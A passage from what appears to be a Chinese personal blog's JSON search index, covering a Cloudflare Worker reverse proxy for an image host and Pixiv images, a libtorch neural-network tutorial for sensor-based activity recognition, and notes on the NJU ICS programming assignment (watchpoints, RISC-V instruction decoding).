new_response_headers.set(\"access-control-allow-origin\", \"*\");\n    new_response_headers.set(\"access-control-allow-credentials\", true);\n    new_response_headers.delete(\"content-security-policy\");\n    new_response_headers.delete(\"content-security-policy-report-only\");\n    new_response_headers.delete(\"clear-site-data\");\n\n    if (new_response_headers.get(\"x-pjax-url\")) {\n      new_response_headers.set(\n        \"x-pjax-url\",\n        response_headers\n          .get(\"x-pjax-url\")\n          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)\n      );\n    }\n\n    const content_type = new_response_headers.get(\"content-type\");\n    if (\n      content_type != null &amp;&amp;\n      content_type.includes(\"text/html\") &amp;&amp;\n      content_type.includes(\"UTF-8\")\n    ) {\n      original_text = await replace_response_text(\n        original_response_clone,\n        upstream_domain,\n        url_hostname\n      );\n    } else {\n      original_text = original_response_clone.body;\n    }\n\n    response = new Response(original_text, {\n      status,\n      headers: new_response_headers,\n    });\n  }\n  return response;\n}\n\nasync function replace_response_text(response, upstream_domain, host_name) {\n  let text = await response.text();\n\n  var i, j;\n  for (i in replace_dict) {\n    j = replace_dict[i];\n    if (i == \"$upstream\") {\n      i = upstream_domain;\n    } else if (i == \"$custom_domain\") {\n      i = host_name;\n    }\n\n    if (j == \"$upstream\") {\n      j = upstream_domain;\n    } else if (j == \"$custom_domain\") {\n      j = host_name;\n    }\n\n    let re = new RegExp(i, \"g\");\n    text = text.replace(re, j);\n  }\n  return text;\n}\n\nasync function device_status(user_agent_info) {\n  var agents = [\n    \"Android\",\n    \"iPhone\",\n    \"SymbianOS\",\n    \"Windows Phone\",\n    \"iPad\",\n    \"iPod\",\n  ];\n  var flag = true;\n  for (var v = 0; v &lt; agents.length; v++) {\n    if (user_agent_info.indexOf(agents[v]) &gt; 0) {\n      flag = false;\n      break;\n    }\n  }\n  return flag;\n}\n部署 Worker，然后在设置 - 域和路由中添加自定义域：\n\n现在您的图床应该可以正常访问了。\nhelloworld.jpg (300×384): https://assets.summ2.link/helloworld.jpg\n小彩蛋\n众所周知，似乎在 2020 年前后，Pixiv\n就无法被直接访问了。下面借此机会，尝试搭建一个 Pixiv\n图床的反向代理服务。由于 i.pximg.net\n的盗链保护，得把之前的代码做一些修改。\n// Website you intended to retrieve for users.\nconst upstream = \"i.pximg.net\";\n\n// Website you intended to retrieve for users using mobile devices.\nconst upstream_mobile = upstream;\n\n// Countries and regions where you wish to suspend your service.\nconst blocked_region = [];\n\n// IP addresses which you wish to block from using your service.\nconst blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];\n\n// Whether to use HTTPS protocol for upstream address.\nconst https = true;\n\n// Whether to disable cache.\nconst disable_cache = false;\n\n// Replace texts.\nconst replace_dict = {\n  $upstream: \"$custom_domain\",\n};\n\naddEventListener(\"fetch\", (event) =&gt; {\n  event.respondWith(fetchAndApply(event.request));\n});\n\nasync function fetchAndApply(request) {\n  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();\n  const ip_address = request.headers.get(\"cf-connecting-ip\");\n  const user_agent = request.headers.get(\"user-agent\");\n\n  let response = null;\n  let url = new URL(request.url);\n  let url_hostname = url.hostname;\n\n  if (https == true) {\n    url.protocol = \"https:\";\n  } else {\n    url.protocol = \"http:\";\n  }\n\n  if (await device_status(user_agent)) {\n    var upstream_domain = upstream;\n  } else {\n    var upstream_domain = upstream_mobile;\n  }\n\n  url.host = upstream_domain;\n/*  if (url.pathname == \"/\") {\n    url.pathname = upstream_path;\n  } else {\n    url.pathname = upstream_path + url.pathname;\n  }*/\n\n  if (blocked_region.includes(region)) {\n    response = new Response(\n      \"Access denied: WorkersProxy is not available in your region yet.\",\n      {\n        status: 403,\n      }\n    );\n  } else if (blocked_ip_address.includes(ip_address)) {\n    response = new Response(\n      \"Access denied: Your IP address is blocked by WorkersProxy.\",\n      {\n        status: 403,\n      }\n    );\n  } else {\n    let method = request.method;\n    let request_headers = request.headers;\n    let new_request_headers = new Headers(request_headers);\n\n    new_request_headers.set('Referer', 'https://www.pixiv.net/');\n\n    let original_response = await fetch(url.href, {\n      method: method,\n      headers: new_request_headers,\n      body: request.body,\n    });\n\n    connection_upgrade = new_request_headers.get(\"Upgrade\");\n    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {\n      return original_response;\n    }\n\n    let original_response_clone = original_response.clone();\n    let original_text = null;\n    let response_headers = original_response.headers;\n    let new_response_headers = new Headers(response_headers);\n    let status = original_response.status;\n\n    if (disable_cache) {\n      new_response_headers.set(\"Cache-Control\", \"no-store\");\n    } else {\n      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");\n    }\n\n    new_response_headers.set(\"access-control-allow-origin\", \"*\");\n    new_response_headers.set(\"access-control-allow-credentials\", true);\n    new_response_headers.delete(\"content-security-policy\");\n    new_response_headers.delete(\"content-security-policy-report-only\");\n    new_response_headers.delete(\"clear-site-data\");\n\n    if (new_response_headers.get(\"x-pjax-url\")) {\n      new_response_headers.set(\n        \"x-pjax-url\",\n        response_headers\n          .get(\"x-pjax-url\")\n          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)\n      );\n    }\n\n    const content_type = new_response_headers.get(\"content-type\");\n    if (\n      content_type != null &amp;&amp;\n      content_type.includes(\"text/html\") &amp;&amp;\n      content_type.includes(\"UTF-8\")\n    ) {\n      original_text = await replace_response_text(\n        original_response_clone,\n        upstream_domain,\n        url_hostname\n      );\n    } else {\n      original_text = original_response_clone.body;\n    }\n\n    response = new Response(original_text, {\n      status,\n      headers: new_response_headers,\n    });\n  }\n  return response;\n}\n\nasync function replace_response_text(response, upstream_domain, host_name) {\n  let text = await response.text();\n\n  var i, j;\n  for (i in replace_dict) {\n    j = replace_dict[i];\n    if (i == \"$upstream\") {\n      i = upstream_domain;\n    } else if (i == \"$custom_domain\") {\n      i = host_name;\n    }\n\n    if (j == \"$upstream\") {\n      j = upstream_domain;\n    } else if (j == \"$custom_domain\") {\n      j = host_name;\n    }\n\n    let re = new RegExp(i, \"g\");\n    text = text.replace(re, j);\n  }\n  return text;\n}\n\nasync function device_status(user_agent_info) {\n  var agents = [\n    \"Android\",\n    \"iPhone\",\n    \"SymbianOS\",\n    \"Windows Phone\",\n    \"iPad\",\n    \"iPod\",\n  ];\n  var flag = true;\n  for (var v = 0; v &lt; agents.length; v++) {\n    if (user_agent_info.indexOf(agents[v]) &gt; 0) {\n      flag = false;\n      break;\n    }\n  }\n  return flag;\n}\n事实上实现基本的反代功能，只需要如下代码：\nexport default {\n  async fetch(request) {\n    const url = new URL(request.url);\n    url.hostname = 'i.pximg.net';\n\n    const proxyRequest = new Request(url, request);\n    proxyRequest.headers.set('Referer', 'https://www.pixiv.net/');\n\n    return fetch(proxyRequest);\n  },\n};\n部署在 pixiv.summ2.link 上，它可以成功配置在 PixEz（一个 Pixiv\n第三方客户端）中。\nExample:\nhttps://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg\n参考\n\n\n\nhttps://en.wikipedia.org/wiki/Proxy_server↩︎\nhttps://en.wikipedia.org/wiki/Reverse_proxy↩︎\n\n\n","categories":["Web"],"tags":["Reverse Proxy"]},{"title":"简单神经网络搭建","url":"/categories/Study/simple-nn/","content":"前言\n程序设计课期末作业要求实现一个「基于可穿戴传感器数据的人体活动识别」，具体是实现一个分类任务。\n\n\n数据采集设备以每秒 1 次的频率记录传感器信息，涵盖加速度（x、y、 z\n轴）、陀螺仪角速度（x、y、z 轴）、温度、湿度、心率、皮肤电反应等共计 561\n个数值型特征维度。每条数据均标注了活动类别标签，包括以下六类：\nWALKING：行走，标记为 1\nWALKING_UPSTAIRS：上楼梯，标记为 2\nWALKING_DOWNSTAIRS：下楼梯，标记为 3\nSITTING：坐着，标记为 4\nSTANDING：站着，标记为 5\nLAYING：平躺，标记为 6\n\n基本设计\n以下代码依赖 C++ libtorch 库，使用 CUDA\n\n数据处理\n读入给定的训练集 X_test.txt 和对应的标签 y_test.txt，并且使用 from_blob 转换为张量类型 torch::tensor()\nclass CustomDataset : public torch::data::Dataset&lt;CustomDataset&gt; {\nprivate:\n    std::vector&lt;torch::Tensor&gt; features_;\n    std::vector&lt;torch::Tensor&gt; labels_;\n\npublic:\n    CustomDataset(const std::string&amp; feature_file, const std::string&amp; label_file) {\n        std::ifstream ffile(feature_file);\n        std::ifstream lfile(label_file);\n\n        if (!ffile.is_open() || !lfile.is_open()) {\n            throw std::runtime_error(\"无法打开特征或标签文件\");\n        }\n\n        std::vector&lt;float&gt; buffer;\n        std::string line;\n\n        // 读取特征\n        while (std::getline(ffile, line)) {\n            std::istringstream ss(line);\n            float val;\n            while (ss &gt;&gt; val) {\n                buffer.push_back(val);\n            }\n        }\n\n        size_t total_samples = buffer.size() / 561;\n        for (size_t i = 0; i &lt; total_samples; ++i) {\n            torch::Tensor x = torch::from_blob(buffer.data() + i * 561, {561}, torch::kFloat).clone();\n            features_.push_back(x);\n        }\n\n        // 读取标签\n        while (std::getline(lfile, line)) {\n            int label = std::stoi(line) - 1; //label:1-6 (expected 0-5)\n            labels_.push_back(torch::tensor(label, torch::kLong));\n        }\n\n        if (features_.size() != labels_.size()) {\n            throw std::runtime_error(\"特征数与标签数不一致！\");\n        }\n    }\n\n};\n定义模型\n为了先让程序跑起来，考虑使用单层神经网络实现需求。\n即只包含一个线性层，其中输入样本特征的大小 561，输出样本特征的大小 6。\n定义：\n\n一个结构体，继承 torch::nn::Module\n线性层 torch::nn::Linear\n前向传播函数 torch::Tensor forward(torch::Tensor x)\n\n使用宏 TORCH_MODULE()，使程序可以调用 torch::save(),\ntorch::load()\nstruct NetImpl : torch::nn::Module {\n    torch::nn::Linear fc{nullptr};\n    NetImpl() {\n        fc = register_module(\"fc\", torch::nn::Linear(561, 6));\n    }\n\n    torch::Tensor forward(torch::Tensor x) {\n        return fc(x);\n    }\n};\n\nTORCH_MODULE(Net);\n训练过程\n此训练过程基于小批量随机梯度下降（SGD）优化算法。具体而言，每个训练迭代将处理一个包含 8 个样本的小批量数据。\n在每个训练周期内： 1. 前向传播 2. 损失计算 3. 梯度清零 4. 反向传播 5.\n参数更新\n使用 torch::data::Dataset&lt;CustomDataset&gt; 的 map 方法，应用转换 (transform)torch::data::transforms::Stack&lt;&gt;() 到数据集的每个单独样本上。这将让多个单独张量堆叠，形成一个批次张量。\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_train.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_train.txt\";\nconst size_t batch_size = 8;\nconst size_t num_epochs = 10;\nconst double learning_rate = 0.01;\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nNet model = Net();\ntorch::optim::SGD optimizer(model-&gt;parameters(), learning_rate);\n\nfor (size_t epoch = 1; epoch &lt;= num_epochs; ++epoch) {\n    model-&gt;train();\n    double total_loss = 0.0;\n    size_t batch_idx = 0;\n\n    for (auto&amp; batch : *data_loader) {\n        auto data = batch.data;\n        auto targets = batch.target;\n\n        auto output = model-&gt;forward(data);\n        auto loss = torch::nn::functional::cross_entropy(output, targets);\n\n        optimizer.zero_grad();\n        loss.backward();\n        optimizer.step();\n        total_loss += loss.template item&lt;double&gt;();\n        ++batch_idx;\n    }\n\n    std::cout &lt;&lt; \"Epoch [\" &lt;&lt; epoch &lt;&lt; \"/\" &lt;&lt; num_epochs &lt;&lt; \"] Avg Loss: \"\n              &lt;&lt; (total_loss / batch_idx) &lt;&lt; std::endl;\n}\n训练完成后，保存模型\ntorch::save(model, \"/home/summer/CLionProjects/cppAssignment202505/model.pt\");\n数据预测\n为了评估模型的泛化能力，我们按照与训练数据相似的方法，读取并处理测试集。\nconst std::string model_path = \"/home/summer/CLionProjects/cppAssignment202505/model.pt\";\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\nconst size_t batch_size = 8;\n\nNet model= Net();\ntorch::load(model, model_path);\nmodel-&gt;eval();\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nsize_t correct = 0;\nsize_t total = 0;\n\nfor (auto&amp; batch : *data_loader) {\n    auto data = batch.data;\n    auto targets = batch.target;\n\n    auto output = model-&gt;forward(data);\n    auto pred = output.argmax(1);\n\n    correct += pred.eq(targets).sum().template item&lt;int64_t&gt;();\n    total += targets.size(0);\n}\n\ndouble accuracy = static_cast&lt;double&gt;(correct) / total * 100.0;\nstd::cout &lt;&lt; \"Test Accuracy: \" &lt;&lt; accuracy &lt;&lt; \"%\" &lt;&lt; std::endl;\n使用上述神经网络得到的结果是:\nTest Accuracy: 94.1636%\n模型优化\n采用残差网络（ResNet）优化模型\n残差块\n采用两层卷积层，两层标准化层以及 ReLU 激活函数。\n\n\nResidual Block\n\n并且定义对 identity 的下采样处理 downsample，使用 torch::nn::Sequential 可以将多个模块堆叠。\nResidualBlock1DImpl(int64_t in_channels, int64_t out_channels, int64_t stride = 1) {\n    conv1 = register_module(\"conv1\", torch::nn::Conv1d(torch::nn::Conv1dOptions(in_channels, out_channels, 3).stride(stride).padding(1).bias(false)));\n    bn1 = register_module(\"bn1\", torch::nn::BatchNorm1d(out_channels));\n    conv2 = register_module(\"conv2\", torch::nn::Conv1d(torch::nn::Conv1dOptions(out_channels, out_channels, 3).stride(1).padding(1).bias(false)));\n    bn2 = register_module(\"bn2\", torch::nn::BatchNorm1d(out_channels));\n\n    if (stride != 1 || in_channels != out_channels) {\n        downsample = register_module(\"downsample\", torch::nn::Sequential(\n            torch::nn::Conv1d(torch::nn::Conv1dOptions(in_channels, out_channels, 1).stride(stride).bias(false)),\n            torch::nn::BatchNorm1d(out_channels)\n        ));\n    }\n}\n定义前向传播的两条路径:\ntorch::Tensor forward(torch::Tensor x) {\n    auto identity = x.clone();\n    x = torch::relu(bn1(conv1(x)));\n    x = bn2(conv2(x));\n\n    if (!downsample-&gt;is_empty()) {\n        identity = downsample-&gt;forward(identity);\n    }\n\n    x += identity;\n    return torch::relu(x);\n}\n残差网络\n我们的网络架构基于 ResNet 的原理，并采用以下具体结构:\n输入 -&gt; 卷积层 -&gt; 标准化层 -&gt; 激活层 -&gt; 残差块 -&gt; 平均池化 -&gt; 全连接层 -&gt; 输出\nstruct ResNet1DImpl : torch::nn::Module {\n    torch::nn::Conv1d conv{nullptr};\n    torch::nn::BatchNorm1d bn{nullptr};\n    torch::nn::Sequential layer1, layer2, layer3;\n    torch::nn::Linear fc{nullptr};\n\n    ResNet1DImpl() {\n        conv = register_module(\"conv\", torch::nn::Conv1d(torch::nn::Conv1dOptions(1, 64, 7).stride(2).padding(3).bias(false)));\n        bn = register_module(\"bn\", torch::nn::BatchNorm1d(64));\n\n        layer1 = register_module(\"layer1\", _make_layer(64, 64, 2, 1));\n        layer2 = register_module(\"layer2\", _make_layer(64, 64, 2, 2));\n        layer3 = register_module(\"layer3\", _make_layer(64, 128, 2, 2));\n\n        fc = register_module(\"fc\", torch::nn::Linear(128, 6));\n    }\n\n    torch::nn::Sequential _make_layer(int64_t in_channels, int64_t out_channels, int blocks, int stride) {\n        torch::nn::Sequential layers;\n        layers-&gt;push_back(ResidualBlock1D(in_channels, out_channels, stride));\n        for (int i = 1; i &lt; blocks; ++i) {\n            layers-&gt;push_back(ResidualBlock1D(out_channels, out_channels));\n        }\n        return layers;\n    }\n\n    torch::Tensor forward(torch::Tensor x) {\n        x = x.unsqueeze(1); // (batch, 1, 561)\n        x = torch::relu(bn(conv(x)));\n        x = layer1-&gt;forward(x);\n        x = layer2-&gt;forward(x);\n        x = layer3-&gt;forward(x);\n\n        x = torch::adaptive_avg_pool1d(x, 1);\n        x = x.view({x.size(0), -1});\n        x = fc(x);\n        return x;\n    }\n};\nTORCH_MODULE(ResNet1D);\n性能优化\n为了加快训练速度，可以将训练过程转移到 GPU 上运行\ntorch::manual_seed(42);\n\ntorch::Device device(torch::kCPU);\nif (torch::cuda::is_available()) {\n    std::cout &lt;&lt; \"CUDA is available! Training on GPU.\" &lt;&lt; std::endl;\n    device = torch::Device(torch::kCUDA);\n}\n\nconst std::string train_feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_train.txt\";\nconst std::string train_label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_train.txt\";\nconst std::string test_feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string test_label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\n\nconst size_t batch_size = 8;\nconst size_t num_epochs = 15;\nconst double learning_rate = 0.001;\n\nauto train_dataset = CustomDataset(train_feature_file, train_label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto train_loader = torch::data::make_data_loader(train_dataset, batch_size);\n\nauto test_dataset = CustomDataset(test_feature_file, test_label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto test_loader = torch::data::make_data_loader(test_dataset, batch_size);\n\nResNet1D model = ResNet1D();\nmodel-&gt;to(device);\n\ntorch::optim::SGD optimizer(model-&gt;parameters(), torch::optim::SGDOptions(learning_rate).momentum(0.9));\n\nfor (size_t epoch = 1; epoch &lt;= num_epochs; ++epoch) {\n    model-&gt;train();\n    double total_loss = 0.0;\n    size_t batch_idx = 0;\n\n    for (auto&amp; batch : *train_loader) {\n        auto data = batch.data.to(device);\n        auto targets = batch.target.to(device);\n\n        optimizer.zero_grad();\n        auto output = model-&gt;forward(data);\n        auto loss = torch::nn::functional::cross_entropy(output, targets);\n        loss.backward();\n        optimizer.step();\n\n        total_loss += loss.template item&lt;double&gt;();\n        batch_idx++;\n    }\n\n    std::cout &lt;&lt; \"Epoch [\" &lt;&lt; epoch &lt;&lt; \"/\" &lt;&lt; num_epochs &lt;&lt; \"] Avg Loss: \" &lt;&lt; total_loss / batch_idx &lt;&lt; std::endl;\n}\n预测部分如下：\nconst std::string model_path = \"/home/summer/CLionProjects/cppAssignment202505/model.pt\";\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\nconst size_t batch_size = 8;\n\ntorch::Device device(torch::kCPU);\nif (torch::cuda::is_available()) {\n    std::cout &lt;&lt; \"CUDA is available! Training on GPU.\" &lt;&lt; std::endl;\n    device = torch::Device(torch::kCUDA);\n}\n\nResNet1D model = ResNet1D();\n\ntry {\n    torch::load(model, model_path);\n    std::cout &lt;&lt; \"Model loaded successfully from: \" &lt;&lt; model_path &lt;&lt; std::endl;\n} catch (const c10::Error&amp; e) {\n    std::cerr &lt;&lt; \"Error loading model: \" &lt;&lt; e.what() &lt;&lt; std::endl;\n    return -1;\n}\n\nmodel-&gt;to(device);\nmodel-&gt;eval();\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nsize_t correct = 0;\nsize_t total = 0;\n\ntorch::NoGradGuard no_grad;\n\nfor (auto&amp; batch : *data_loader) {\n    auto data = batch.data;\n    auto targets = batch.target;\n\n    data = data.to(device);\n    targets = targets.to(device);\n\n    auto output = model-&gt;forward(data);\n\n    auto pred = output.argmax(1);\n\n\n    correct += pred.eq(targets).sum().template item&lt;int64_t&gt;();\n    total += targets.size(0);\n}\n\n\ndouble accuracy = static_cast&lt;double&gt;(correct) / total * 100.0;\nstd::cout &lt;&lt; \"Test Accuracy: \" &lt;&lt; accuracy &lt;&lt; \"%\" &lt;&lt; std::endl;\n\nreturn 0;\n改进后的模型得到的结果是：\nTest Accuracy: 96.4031%\n","categories":["Study"],"tags":["Neural network"]},{"title":"NJU ICS PA 一些笔记","url":"/categories/Study/nju-ics-pa/","content":"Do you know\n本人代码水平拙劣🥲，实现部分仅供参考\n\n\n南京大学\n计算机科学与技术系 计算机系统基础 课程实验 2024\nPA1 - 开天辟地的篇章\nRTFSC\n文件：nemu/src/monitor/sdb/sdb.c\n原因：退出时 nemu_state.state 不是 “正常” 的\n解决办法：\nstatic int cmd_q(char *args) {\n  nemu_state.state = NEMU_QUIT;\n  return -1;\n}\n监视点\n基本框架\n添加 w &lt;expr&gt; 和 d &lt;index&gt; 命令，来添加和删除监视点。\n并且需要实现监视点池中链表的维护，监视点表达式的计算。\n为了提高 NEMU 的性能，提供监视点功能的开关选项。\n链表维护\n监视点池中涉及监视点链表和空闲链表，通过 init_wp_pool() 来对其初始化。\nvoid init_wp_pool() {\n  int i;\n  for (i = 0; i &lt; NR_WP; i ++) {\n    wp_pool[i].NO = i;\n    wp_pool[i].next = (i == NR_WP - 1 ? NULL : &amp;wp_pool[i + 1]);\n  }\n\n  head = NULL;\n  free_ = wp_pool;\n}\n接着，通过 new_wp() 和 free_wp() 实现监视点的管理\nint new_wp(char* args){\n  WP *p=NULL,*q=NULL;\n  if (free_==NULL)\n  {\n    printf(\"Watchpoints Limit\");\n    return -1;\n  }\n  p=free_;\n  bool success=1;\n  p-&gt;result = expr(args,&amp;success);\n  if (!success)return -1;\n  p-&gt;expr = strdup(args);\n  free_=free_-&gt;next;\n  if (head!=NULL)\n  {\n    q=head;\n    while (q-&gt;next!=NULL)q=q-&gt;next;\n    q-&gt;next=p;\n    return 1;\n  }\n  head=p;\n  head-&gt;next=NULL;\n  return 1;\n}\nvoid free_wp(int no)\n{\n  if (head==NULL)\n  {\n\tprintf(\"Watchpoint %d not found.\\n\",no);\n    return;\n  }\n  if (head-&gt;NO==no)\n  {\n    WP *wp=head;\n    head=wp-&gt;next;\n    wp-&gt;next=free_;\n    free_=wp;\n    return;\n  }\n  WP *p=NULL;\n  if (head!=NULL)\n  {\n    p=head;\n    while (1){\n      if (p-&gt;next-&gt;NO==no){\n        WP *wp=p-&gt;next;\n        p-&gt;next=wp-&gt;next;\n        wp-&gt;next=free_;\n        free_=wp;\n        return;\n      }\n      if (p-&gt;next==NULL)\n      {\n        printf(\"Watchpoint %d not found.\\n\",no);\n        return;\n      }\n      p=p-&gt;next;\n    }\n  }\n}\n监视点求值\n为了判断监视点的值是否发生变化，还需要在结构体中添加一个成员来记录。然后通过 check_expr() 来求值和判断变化。\nbool check_expr(){\n  bool changed=false;\n  if (head==NULL)return 0;\n  WP *p;\n  bool success=true;\n  p=head;\n  word_t result = expr(p-&gt;expr,&amp;success);\n  if (result!=p-&gt;result &amp;&amp; success)\n  {\n    printf(\"Watchpoint %d changed at 0x%x.\\n\",p-&gt;NO,cpu.pc);\n    changed=true;\n  }\n  if (changed)return 1;\n  return 0;\n}\n如何阅读手册\n程序是个状态机\n对于计算 1+2+...+100 的程序的状态机，它是确定性的。\n(0, x, x) -&gt; (1, 0, x) -&gt; (2, 0, 0) -&gt; (3, 0, 1) -&gt; (4, 1, 1) -&gt; (5, 1, 2) -&gt; (6, 3, 2) -&gt; ... -&gt; (199,4851, 99) -&gt; (200, 4950, 99) -&gt; (201, 4950, 100) -&gt; (202, 5050, 100)\n理解基础设施\n不必多说，使用过调试器的话肯定有所体会。\nRTFM\nriscv32 有哪几种指令格式？\nThere are four core instruction formats.\nRegister-Type, Immediate-Type, Store-Type, Upper Immediate-Type.\nLUI 指令的行为是什么？\nLUI (load upper immediate) is used to build 32-bit constants and uses\nthe U-type format. LUI places the 32-bit U-immediate value into the\ndestination register rd, filling in the lowest 12 bits with zeros.\n\n\nLUI\n\nmstatus 寄存器的结构是怎么样的？\nThe mstatus (Machine Status) register is an MXLEN-bit read/write\nregister formatted as shown in figures below. It's a Control and\nStatus Register.\n为什么要使用 -Wall 和 -Werror?\nAt section 3.9, we found that:\n-Werror Turn all warnings into errors.\n-Wall This enables all the warnings about constructions\nthat some users consider questionable, and that are easy to avoid (or\nmodify to prevent the warning), even in conjunction with macros. This\nalso enables some language-specific warnings.\nTo add these options, we can leverage compilers to identify potential\nissues in our programs.\nshell 命令\n使用 find . -type f \\( -name \"*.c\" -o -name \"*.h\" \\) -print0 | xargs -0 wc -l 来统计行数\n由于我环境经历了多次迁移，似乎把 git 弄坏了（\n不过毕竟我没有提交作业的需求，就不注意这些细节了\nPA2 - 简单复杂的机器\n不停计算的机器\n画出在 YEMU 上执行的加法程序的状态机\n类似地，使用一个 6 元组来分别表示 PC, R [0], R [1], M [x], M [y], M [z].\n(0, 0, 0, x, y ,0) -&gt; (1, y, 0, x, y, 0) -&gt; (2, y, y, x, y, 0) -&gt; (3, x, y , x, y, 0) -&gt; (4, x+y, y, x, y, 0) -&gt; (5, x+y, y, x, y, x+y)\nRTFSC(2)\n立即数背后的故事\n1. 假设我们需要将 NEMU 运行在 Motorola\n68k 的机器上 (把 NEMU 的源代码编译成 Motorola 68k 的机器码)\n此时读取的字节序列会被解释为大端序的，如果在二进制文件中以小端序存储，可能会导致问题。\n2. 假设我们需要把 Motorola 68k 作为一个新的 ISA 加入到 NEMU 中\n我们需要正确模拟大端序对应的存储结构与解释方式。\n立即数背后的故事 (2)\n在 RISC-V32 中，一般使用分部加载的方式：\n通过 lui 加载高 20 位，addi 加载低 12 位\nlui x10, 0x0D000\naddi x10, x10, 0x721\nauipc 的执行过程\nQEMU 内建的第一条指令，正是 auipc\n0x00000297,  // auipc t0,0\n在 QEMU 运行过程中，首先调用 exec_once() 来进入相应的处理流程。\nstatic void exec_once(Decode *s, vaddr_t pc) {\n  s-&gt;pc = pc;\n  s-&gt;snpc = pc;\n  isa_exec_once(s);\n  cpu.pc = s-&gt;dnpc;\n  \n//some macros...\n}\n传入的 Decode 是一个包含与 PC 有关变量的结构体\ntypedef struct Decode {\n  vaddr_t pc;\n  vaddr_t snpc; // static next pc\n  vaddr_t dnpc; // dynamic next pc\n  ISADecodeInfo isa;\n  IFDEF(CONFIG_ITRACE, char logbuf[128]);\n} Decode;\n然后调用 isa_exec_once(s)，对于不同的架构，具体的定义不同。\ninstruction fetch\n在 risc-v32 的实现中，代码如下\nint isa_exec_once(Decode *s) {\n  s-&gt;isa.inst = inst_fetch(&amp;s-&gt;snpc, 4);\n  return decode_exec(s);\n}\n具体的过程又涉及到 vaddr_read() 和 paddr_read()，处理 mmio 地址和 pmem 地址，物理内存上使用 host_read() 读取主机内存上的不同长度字节。\ninstruction decode\n完成取指调用的一系列函数后，isa_exec_once() 会返回 decode_exec(s)\n将指令与相应的模式匹配\nstatic int decode_exec(Decode *s) {\n  s-&gt;dnpc = s-&gt;snpc;\n\n#define INSTPAT_INST(s) ((s)-&gt;isa.inst)\n#define INSTPAT_MATCH(s, name, type, ... /* execute body */ ) { \\\n  int rd = 0; \\\n  word_t src1 = 0, src2 = 0, imm = 0; \\\n  decode_operand(s, &amp;rd, &amp;src1, &amp;src2, &amp;imm, concat(TYPE_, type)); \\\n  __VA_ARGS__ ; \\\n}\n\n  INSTPAT_START();\n  INSTPAT(\"??????? ????? ????? ??? ????? 00101 11\", auipc  , U, R(rd) = s-&gt;pc + imm);\n  INSTPAT(\"??????? ????? ????? 100 ????? 00000 11\", lbu    , I, R(rd) = Mr(src1 + imm, 1));\n  INSTPAT(\"??????? ????? ????? 000 ????? 01000 11\", sb     , S, Mw(src1 + imm, 1, src2));\n\n  INSTPAT(\"0000000 00001 00000 000 00000 11100 11\", ebreak , N, NEMUTRAP(s-&gt;pc, R(10))); // R(10) is $a0\n  INSTPAT(\"??????? ????? ????? ??? ????? ????? ??\", inv    , N, INV(s-&gt;pc));\n  INSTPAT_END();\n\n  R(0) = 0; // reset $zero to 0\n\n  return 0;\n}\n其中，auipc 对应的 (U-Type) 格式如下：\n\n\nAUIPC\n\nexecute\nQEMU 在宏中定义了 auipc 的具体行为：\nINSTPAT(\"??????? ????? ????? ??? ????? 00101 11\", auipc  , U, R(rd) = s-&gt;pc + imm);\npattern_decode（）中的宏处理了格式字符串：\nstatic inline void pattern_decode(const char *str, int len,\n    uint64_t *key, uint64_t *mask, uint64_t *shift) {\n  uint64_t __key = 0, __mask = 0, __shift = 0;\n#define macro(i) \\\n  if ((i) &gt;= len) goto finish; \\\n  else { \\\n    char c = str[i]; \\\n    if (c != ' ') { \\\n      Assert(c == '0' || c == '1' || c == '?', \\\n          \"invalid character '%c' in pattern string\", c); \\\n      __key  = (__key  &lt;&lt; 1) | (c == '1' ? 1 : 0); \\\n      __mask = (__mask &lt;&lt; 1) | (c == '?' ? 0 : 1); \\\n      __shift = (c == '?' ? __shift + 1 : 0); \\\n    } \\\n  }\n\n#define macro2(i)  macro(i);   macro((i) + 1)\n#define macro4(i)  macro2(i);  macro2((i) + 2)\n#define macro8(i)  macro4(i);  macro4((i) + 4)\n#define macro16(i) macro8(i);  macro8((i) + 8)\n#define macro32(i) macro16(i); macro16((i) + 16)\n#define macro64(i) macro32(i); macro32((i) + 32)\n  macro64(0);//宏展开，遍历了6位二进制数0b000000的任意取值\n  panic(\"pattern too long\");\n#undef macro\nfinish:\n  *key = __key &gt;&gt; __shift;\n  *mask = __mask &gt;&gt; __shift;\n  *shift = __shift;\n}\n运行第一个 C 程序\n我们需要在此部分实现的指令有 lui, addi,\njal, jalr.\n按照 RISC-V 手册实现即可。\n需要注意不同指令对待操作数的符号和截断处理。\n指令名对照\n方法很多，可以根据 opcode 段查询。\n程序，运行时环境与 AM\n运行时环境\n要求实现 spirntf() 等等库函数，可以参考 glibc 或者 STFW.\nRTFSC(3)\n对各个 section 的定义如下\n//abstract-machine/scripts/linker.ld\n\nENTRY(_start)\nPHDRS { text PT_LOAD; data PT_LOAD; }\n\nSECTIONS {\n  /* _pmem_start and _entry_offset are defined in LDFLAGS */\n  . = _pmem_start + _entry_offset;\n  .text : {\n    *(entry)\n    *(.text*)\n  } : text\n  etext = .;\n 